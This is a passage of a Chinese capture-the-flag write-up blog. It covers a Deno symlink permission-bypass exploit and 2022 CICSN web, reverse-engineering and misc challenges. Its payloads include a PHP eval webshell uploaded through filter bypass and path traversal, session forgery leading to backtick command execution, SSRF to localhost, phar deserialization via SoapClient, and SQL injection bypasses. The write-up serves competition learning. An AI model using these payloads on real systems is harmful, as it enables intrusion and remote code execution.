class="hljs-string">&#x27;0&#x27;</span>)<br>        elif i == <span class="hljs-string">&quot;y&quot;</span>:<br>            s.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-title function_">join</span>(s)<br></code></pre></td></tr></table></figure><h1 id="Jurassic-W0r1d"><a href="#Jurassic-W0r1d" class="headerlink" title="Jurassic W0r1d"></a>Jurassic W0r1d</h1><blockquote><p> 给了一个没有读取权限的Deno Playground 从来没见过…</p></blockquote><p>兜兜转转还是得认认真真的看GIthub的issues</p><p>先是看到了symlink<a href="https://github.com/denoland/deno/pull/12154">https://github.com/denoland/deno/pull/12154</a></p><p><img src="/../imgs/20220627BSidesTLVCTF/Untitled.png" alt="Untitled"></p><p>猜测symlink可以越权读取文件</p><p>测试了一下发现必须要有写的权限没有可写路径，然后找了一下有没有可以写入的权限</p><p>之前测试了一下一些Deno的基本函数，发现cwd可以看到当前会话的临时目录，临时目录还是写不了，</p><p>认认真真看issues，看到了这个<a href="https://github.com/denoland/deno/issues/14668">https://github.com/denoland/deno/issues/14668</a></p><p><img src="/../imgs/20220627BSidesTLVCTF/Untitled%201.png" alt="Untitled"></p><p>总的来说，可以越权获得写入缓存的权限，测试了一下这个函数可以</p><p>exp</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> cwd = <span class="hljs-title class_">Deno</span>.<span class="hljs-title function_">cwd</span>();<br><span class="hljs-keyword">const</span> desc1 = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-attr">path</span>: cwd &#125; ;<br><span class="hljs-keyword">const</span> status1 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Deno</span>.<span class="hljs-property">permissions</span>.<span class="hljs-title function_">request</span>(desc1);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(status1);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\n[*] listing files from /\n&quot;</span>);<br><span class="hljs-keyword">await</span> <span class="hljs-title class_">Deno</span>.<span class="hljs-title function_">symlink</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>, cwd+<span class="hljs-string">&quot;/hacker2.txt&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">await</span> <span class="hljs-title class_">Deno</span>.<span class="hljs-title function_">readTextFile</span>(cwd+<span class="hljs-string">&quot;/hacker2.txt&quot;</span>));<br></code></pre></td></tr></table></figure><p><img src="/../imgs/20220627BSidesTLVCTF/Untitled%202.png" alt="Untitled"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-CICSN华东北-Web/Re/Misc-部分Wp</title>
    <link href="https://www.imfengyuan.info/2022/06/25/20220619CICSNHDB/"/>
    <id>https://www.imfengyuan.info/2022/06/25/20220619CICSNHDB/</id>
    <published>2022-06-25T11:19:23.000Z</published>
    <updated>2022-06-25T12:20:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-CICSN华东北-Web-x2F-Re-x2F-Misc-部分Wp"><a href="#2022-CICSN华东北-Web-x2F-Re-x2F-Misc-部分Wp" class="headerlink" title="2022-CICSN华东北-Web&#x2F;Re&#x2F;Misc-部分Wp"></a>2022-CICSN华东北-Web&#x2F;Re&#x2F;Misc-部分Wp</h1><blockquote><p>赛后跟几位大佬交流了一下，分享一下复现的一些思路</p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="会聊天的机器人"><a href="#会聊天的机器人" class="headerlink" title="会聊天的机器人"></a>会聊天的机器人</h3><p>很容易发现image部分可以进行file协议文件读取，但是没找到flag，这时候看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">///var/www/html/api.php</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">init</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$sesspath</span> = <span class="hljs-string">&quot;/tmp/session&quot;</span>;<br>    <span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-variable">$sesspath</span>);<br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;cname&#x27;</span>])<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;cname&#x27;</span>] = <span class="hljs-string">&#x27;ck&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_dir_exists</span>(<span class="hljs-string">&quot;/tmp/resource&quot;</span>))<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;/tmp/resource&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_dir_exists</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dir</span>(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span>)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span>-&gt;<span class="hljs-title function_ invoke__">read</span>())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getres</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-title function_ invoke__">log_write</span>(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;/tmp/resource/&quot;</span>);<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;cname&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_dir_exists</span>(<span class="hljs-variable">$path</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;请先上传词库文件。&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$ck</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>),<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ck</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$key</span>,<span class="hljs-variable">$input</span>) <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$input</span>,<span class="hljs-variable">$key</span>))&#123;<br>            <span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">key</span>(<span class="hljs-variable">$value</span>);<br>            <span class="hljs-variable">$v</span> = <span class="hljs-variable">$value</span>[<span class="hljs-variable">$type</span>];<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$type</span>)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;string&quot;</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$v</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image&quot;</span>:<br>                    <span class="hljs-variable">$b64img</span> = <span class="hljs-string">&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$v</span>)) . <span class="hljs-string">&#x27;&quot;/&gt;&#x27;</span>;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$b64img</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;calc&quot;</span>:<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;is_admin&#x27;</span>])&#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\(|\)|\&#x27;|\&quot;/im&quot;</span>,<span class="hljs-variable">$v</span>))&#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;包含非法字符&quot;</span>;<br>                        &#125;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v</span>;&quot;</span>);<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;admin才能使用这个功能&quot;</span>;<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个动作暂时还没能实现&quot;</span>;<br>            &#125;<br><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;没有匹配到词库消息&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadc</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uploadc&#x27;</span>];<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cname&#x27;</span>];<br>    <span class="hljs-variable">$resourcedir</span> = <span class="hljs-string">&quot;/tmp/resource/&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_dir_exists</span>(<span class="hljs-variable">$resourcedir</span>))<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$resourcedir</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;&lt;&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;别这样！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;别这样！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;cname&#x27;</span>] = <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$resourcedir</span>.<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$data</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传成功&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log_write</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>)</span>&#123;<br>    <span class="hljs-variable">$logpath</span> = <span class="hljs-string">&quot;log.txt&quot;</span>;<br>    <span class="hljs-variable">$oper</span> = <span class="hljs-title function_ invoke__">session_id</span>();<br>    <span class="hljs-variable">$opername</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$oper</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt;= <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$oper</span>);<span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$opername</span> .= <span class="hljs-string">&quot;*&quot;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$logpath</span>,<span class="hljs-string">&quot;<span class="hljs-subst">$opername</span> : <span class="hljs-subst">$msg</span> \n&quot;</span>,FILE_APPEND);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;input&#x27;</span>]))<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getres</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;input&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uploadc&#x27;</span>]))<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">uploadc</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;clear&#x27;</span>]))<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;log.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;log&#x27;</span>]))<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;log.txt&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="思路1：函数uploadc，过滤绕过，目录穿越些shell"><a href="#思路1：函数uploadc，过滤绕过，目录穿越些shell" class="headerlink" title="思路1：函数uploadc，过滤绕过，目录穿越些shell"></a>思路1：函数uploadc，过滤绕过，目录穿越些shell</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>(strpos($data,<span class="hljs-string">&quot;&lt;&quot;</span>)  <span class="hljs-meta"># $data=<span class="hljs-string">&quot;&lt;?php xxxx&quot;</span></span><br><span class="hljs-keyword">if</span>(strpos($filename,<span class="hljs-string">&quot;.&quot;</span>) <span class="hljs-meta">#$filename=<span class="hljs-string">&quot;../xxx&quot;</span></span><br></code></pre></td></tr></table></figure><p>这两个判断，很容易绕过，只要data和filename开头是对应的”&lt;”和”.”导致strpos返回值为0，即可绕过。</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">uploadc=<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span>&amp;cname=../../../xxx.php<br></code></pre></td></tr></table></figure><h4 id="思路2：目录穿越伪造session，使用calc功能"><a href="#思路2：目录穿越伪造session，使用calc功能" class="headerlink" title="思路2：目录穿越伪造session，使用calc功能"></a>思路2：目录穿越伪造session，使用calc功能</h4><p>伪造部分，查阅资料，或者直接file协议看看自己的session长什么样子</p><p>exp</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">uploadc</span>=is_admin|s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;xx&quot;</span><span class="hljs-comment">;&amp;cname=../session/sess_xxxx</span><br></code></pre></td></tr></table></figure><p>修改Cookie为PHPSESSID&#x3D;xxxx，上传词库规则，使用&#96;&#96;，进行绕过非法字符，执行命令即可</p><p>exp</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&#123;<span class="hljs-string">&quot;calc&quot;</span>:<span class="hljs-string">&quot;`ls /`&quot;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><p>访问flag.php，发现需要本地访问之后，就可以写入flag.txt</p><h4 id="思路1-getimagesize-SSRF"><a href="#思路1-getimagesize-SSRF" class="headerlink" title="思路1:getimagesize-SSRF"></a>思路1:getimagesize-SSRF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$img</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;img&quot;</span>]<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$img</span>))&#123;<br><span class="hljs-title function_ invoke__">checkimg</span>(<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">checkimg</span>(<span class="hljs-variable">$img</span>)&#123;<br>   ...<br><span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$img</span>);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p> 这里直接GET添加参数?img&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><h4 id="思路2-file-get-contents-SSRF"><a href="#思路2-file-get-contents-SSRF" class="headerlink" title="思路2:file_get_contents-SSRF"></a>思路2:file_get_contents-SSRF</h4><p>上传图片的时候，（在进行正则匹配前会进行file_get_contents，实现ssrf）修改内容为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-Type: image/gif<br><br>file://127.0.0.1/flag.php<br></code></pre></td></tr></table></figure><h4 id="思路3-原生类利用-phar内容检测绕过-getimagesize-phar反序列化"><a href="#思路3-原生类利用-phar内容检测绕过-getimagesize-phar反序列化" class="headerlink" title="思路3: 原生类利用+phar内容检测绕过+getimagesize+phar反序列化"></a>思路3: 原生类利用+phar内容检测绕过+getimagesize+phar反序列化</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$clie</span>nt = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-built_in">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>));<br><span class="hljs-symbol">$o</span>bj = <span class="hljs-keyword">new</span> Mysql()<br><span class="hljs-symbol">$o</span>bj-&gt;conn = <span class="hljs-symbol">$cle</span>nt<br><br><span class="hljs-symbol">$p</span>har = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <br><span class="hljs-symbol">$p</span>har-&gt;startBuffering();<br><span class="hljs-symbol">$p</span>har-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-symbol">$p</span>har-&gt;setMetadata(<span class="hljs-symbol">$o</span>bj);<br><span class="hljs-symbol">$p</span>har-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-symbol">$p</span>har-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了<code>php</code>，但不影响反序列化的结果。</p><p>最后利用getimagesize进行phar反序列化绕过。</p><h3 id="Ezsql"><a href="#Ezsql" class="headerlink" title="Ezsql"></a>Ezsql</h3><p>很容易找到触发点customer，sqlmap一波梭发现FI@g，但是返回</p><h4 id="思路1-关键字绕过"><a href="#思路1-关键字绕过" class="headerlink" title="思路1: 关键字绕过"></a>思路1: 关键字绕过</h4><p>使用&#96;&#96;进行绕过，linux会作为命令执行，所以添加转义符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap ... -C  \`FI@g\`<br></code></pre></td></tr></table></figure><h4 id="思路2：直接union进行无字段注入查询"><a href="#思路2：直接union进行无字段注入查询" class="headerlink" title="思路2：直接union进行无字段注入查询"></a>思路2：直接union进行无字段注入查询</h4><p>可以进行</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">类似于 `1` 进行无字段注入<br></code></pre></td></tr></table></figure><p>但因为一个字段一个值，所以也可以直接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">union select 1,(select * from xxxx),2,……<br></code></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Easycry"><a href="#Easycry" class="headerlink" title="Easycry"></a>Easycry</h3><h4 id="思路：Findcrypt确认是AES，密文和key解出"><a href="#思路：Findcrypt确认是AES，密文和key解出" class="headerlink" title="思路：Findcrypt确认是AES，密文和key解出"></a>思路：Findcrypt确认是AES，密文和key解出</h4><p>AES S盒特征</p><p><img src="/../imgs/20220619CICSNHDB/image-20220624140808585.png" alt="image-20220624140808585"></p><p>这里应该是key初始化</p><img src="../imgs/20220619CICSNHDB/image_24-Hj9V-lr.png" style="zoom:25%;" /><p>传入的这串数据应该就是key，没有看到有iv的传入值，应该就是ECB</p><p>000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F</p><p><img src="/../imgs/20220619CICSNHDB/image_hXC_9J9Soa.png"></p><h3 id="Crackme2"><a href="#Crackme2" class="headerlink" title="Crackme2"></a>Crackme2</h3><h4 id="思路：Apk中的AES类和key写入tmp文件，so库中提取该key和iv，加密输入进行比对"><a href="#思路：Apk中的AES类和key写入tmp文件，so库中提取该key和iv，加密输入进行比对" class="headerlink" title="思路：Apk中的AES类和key写入tmp文件，so库中提取该key和iv，加密输入进行比对"></a>思路：Apk中的AES类和key写入tmp文件，so库中提取该key和iv，加密输入进行比对</h4><p><img src="/../imgs/20220619CICSNHDB/image_u4Iz1gbMGo.png"></p><p>将aes类以某种形式和key写入tmp文件</p><p><img src="/../imgs/20220619CICSNHDB/image_DJnLAAd2ba.png"></p><p>看到aesEncrypt中encrypt，可以看到是cbc模式下，但是在apk中没有调用，转过头去看so文件中jni调用</p><p><img src="/../imgs/20220619CICSNHDB/image_K42EP6mmI-.png"></p><p>apk解压提取so</p><p><img src="/../imgs/20220619CICSNHDB/image_qIg8L77pCi.png"></p><p>可以猜到这里应该调用了encrypt，这里应该就是iv</p><p><img src="/../imgs/20220619CICSNHDB/image_P0fCDgsEty.png"></p><p>下面就是要找密文</p><img src="../imgs/20220619CICSNHDB/image-20220624142537662.png" alt="image-20220624142537662" style="zoom:25%;" /><img src="../imgs/20220619CICSNHDB/image_bU6qJVKNOf.png" style="zoom:33%;" /><p>万事俱备，接一下（hex输出一下），拿去验证一</p><img src="../imgs/20220619CICSNHDB/image_dgwIXuKV20.png" style="zoom:33%;" /><img src="../imgs/20220619CICSNHDB/image_ZyUew6tSIn.png" style="zoom:25%;" /><blockquote><p>这两个部分的RE作出来的感觉像取证，这个题应该会被吐槽吧，而且都是AES，MIsc也有AES，真绝了，他们出题人是跟AES有多大的仇。</p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Pikalang"><a href="#Pikalang" class="headerlink" title="Pikalang"></a>Pikalang</h2><h3 id="解题思路及过程"><a href="#解题思路及过程" class="headerlink" title="解题思路及过程"></a>解题思路及过程</h3><p>用zsteg发现有奇怪数据</p><img src="../imgs/20220619CICSNHDB/image_0pLnOeMePJ.png" style="zoom:25%;" /><p>直接base64，但是pikalang不太对</p><img src="../imgs/20220619CICSNHDB/image_QZKMj3LCb7.png" style="zoom:25%;" /><p>怀疑提取数据少了，手工提一下</p><img src="../imgs/20220619CICSNHDB/image_icZKHEHr6t.png" style="zoom:25%;" /><p>base64+pikalang</p><img src="../imgs/20220619CICSNHDB/image_bPdUMZbSzT.png" style="zoom:25%;" /><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>flag{d6246d1f41fad032ee30193f3af15408}</p><h2 id="Snowberg"><a href="#Snowberg" class="headerlink" title="Snowberg"></a>Snowberg</h2><h3 id="解题思路及过程-1"><a href="#解题思路及过程-1" class="headerlink" title="解题思路及过程"></a>解题思路及过程</h3><p>发现一个ZIP</p><img src="../imgs/20220619CICSNHDB/image_cIxXKJnS3a.png" style="zoom:25%;" /><p>提取</p><p><img src="/../imgs/20220619CICSNHDB/image_SjgcV06qSZ.png"></p><p>大小只有6字节，考虑crc爆破</p><p><img src="/../imgs/20220619CICSNHDB/image_AhlYouG5Re.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 ~/Downloads/crc32-master/crc32.py reverse 0x17B1A8BC<br>6 bytes: 1s\_k3y (OK)<br>6 bytes: und\_th (OK)<br>6 bytes: y0u\_f0 (OK)<br>y0u\_f0und\_th1s\_k3y<br></code></pre></td></tr></table></figure><ul><li>获得Key：63f0c7380cc3a35</li></ul><blockquote><p>因为是key，所以也试了很多图片隐写的解密 lsb啥的，但都不行，最后还是回过头来看crc了，正好因为上上个月的ichunqiu比赛里有crc隐写，然后尝试了一下，就可以。</p></blockquote><p><img src="/../imgs/20220619CICSNHDB/image-20220624141543273.png" alt="image-20220624141543273"></p><p><img src="/../imgs/20220619CICSNHDB/image_FB1Wjp8Vhf.png"></p><p>惊讶住了。正好和cap的加密方式一样。</p><p><img src="/../imgs/20220619CICSNHDB/image_kKxC1COteL.png"></p><p>拿key出了。</p><p><img src="/../imgs/20220619CICSNHDB/image_h0kxJxg4wG.png"></p><h2 id="folder’s-revenge"><a href="#folder’s-revenge" class="headerlink" title="folder’s revenge"></a>folder’s revenge</h2><h4 id="思路：文件隐写，Inflate解压缩"><a href="#思路：文件隐写，Inflate解压缩" class="headerlink" title="思路：文件隐写，Inflate解压缩"></a>思路：文件隐写，Inflate解压缩</h4><p>简单看了一圈，没有flag</p><img src="../imgs/20220619CICSNHDB/image_cRzDDJ9dsW.png" style="zoom:25%;" /><img src="../imgs/20220619CICSNHDB/image_QbOBANp1zP.png" style="zoom:25%;" 